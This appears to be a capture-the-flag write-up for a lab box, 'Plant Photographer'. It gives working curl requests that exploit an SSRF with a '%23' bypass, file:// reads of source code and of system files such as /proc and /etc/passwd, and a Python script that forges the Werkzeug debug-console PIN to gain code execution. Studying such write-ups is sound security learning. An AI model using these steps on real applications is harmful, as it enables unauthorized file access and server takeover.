## Plant Photographer

Tags: #SSRF, #Python, #OpenDebugServer
Honestly as soon as file access was there, it opened up like a shaken can of soda.

```shell
# Nmap scan
sudo nmap -sC -sV --top-ports=1000 $IPADDR -oN nmap01.log
# Nmap 7.98 scan initiated Thu May  7 09:56:48 2026 as: /usr/lib/nmap/nmap -sC -sV --top-ports=1000 -oN nmap01.log 10.128.133.139
Nmap scan report for 10.128.133.139
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:fd:35:2e:eb:44:27:2e:93:fe:14:91:7a:d2:fa:e0 (RSA)
|   256 b1:27:11:68:96:a6:5c:8f:19:5f:2c:f0:86:e4:bc:af (ECDSA)
|_  256 6e:9a:68:56:93:40:99:c2:6a:fe:33:32:50:4f:d2:a3 (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.10.7)
|_http-title: Jay Green
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May  7 09:57:03 2026 -- 1 IP address (1 host up) scanned in 14.68 seconds

# dir enumeration
gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,log,php,html,js,json,jsx,eml -t 50 -u 10.128.133.139 -o gobusterdir.log
## found /download, /console and /admin

# Checked out the website
## Download link for resume intercepted
curl 'http://10.128.133.139/download?server=secure-file-storage.com:8087&id=75482342' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://10.128.133.139/' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i'
  

# Checked for SSRF
## Py server
python -m http.server 8000 # file present pingmemoron.txt
## hit on local
curl 'http://10.128.133.139/download?server=<MYIPADDR>:8000&id=pingmemoron.txt' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://10.128.133.139/' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' -o-
### hit on local but with extra path params
### Some source code with error lines and debug logs also returned
## def download():
#     file_id = request.args.get('id','')
#     server = request.args.get('server','')
#     if file_id!='':
#         filename = str(int(file_id)) + '.pdf'
#         response_buf = BytesIO()
#         crl = pycurl.Curl()
#         crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)
#         crl.setopt(crl.WRITEDATA, response_buf)


# Bypass extra path params by using # i.e. '%23'
curl 'http://10.128.133.139/download?server=<MYIPADDR>:8000/pingmemoron.txt%23&id=75482342' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://10.128.133.139/' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i'
### got a hit

# Check for true SSRF on file system - tried hitting file mentioned in debug logs
curl 'http://10.128.133.139/download?server=file:///usr/src/app/app.py%23&id=75482342' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://10.128.133.139/' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i'
### found complete source code - can enumerate more if reqd

# found this much but not the flags - needed help there
## first flag - intercept the req to py server and check X-API-KEY header
##  - if i'd used `nc -lvnp 8000` it must've been visible
## second flag - forgot to hit the admin end-point on file server which i enumerated afterwards
curl 'http://10.128.133.139/admin'
# only allowed via admin interface
curl 'http://10.128.133.139/download?server=secure-file-storage.com:8087/admin&id=75482342' # nothing
curl 'http://10.128.133.139/download?server=secure-file-storage.com:8087/admin%23&id=75482342' # got a pdf with 2nd flag

# checked for vulns on Werkzeug dependency - hacktricks.xyz - mentioned in debug logs
## Debug flags for application = True
## So PIN for console page are algorithmically generated
## found PIN generation code within files
## followed hacktricks for `probably_public_bits` and `private_bits` and to grab the exploit used our beloved GPTs
## for `private_bits` logic is different due to version mismatch - so pulled code from within our target's servers and modded the exploit. target used 0.16.0
curl 'http://10.128.133.139/download?server=usr/local/lib/python3.10/site-packages/werkzeug/debug/__init__.py%23&id=75482342'

### username - /proc/self/status => UID for self > /etc/passwd => Map UID to user => `root`
### str(uuid.getnode()) => MAC address => /sys/class/net/eth0/address => python3 -c 'print(int("{MAC}".replace(":",""),16))'
### get_machine_id() => for v0.16.0 /proc/sys/cgroup is used => used concat with /proc/sys/kernel/random/boot_id earlier

python3 exploit.py
# used the pin for console access
# found the flag in /usr/src/app as flag-<some-gibberish>.txt
```

## Exploit for console access PIN

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'root',  # username
    # Defaults
    ## modname
    ## getattr(app, '__name__', getattr(app.__class__, '__name__'))
    # getattr(mod, '__file__', None),
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.10/site-packages/flask/app.py'
]

private_bits = [
    '2485378088962',  # str(uuid.getnode()),  /sys/class/net/eth0/address
    '77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca'  # get_machine_id()
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```
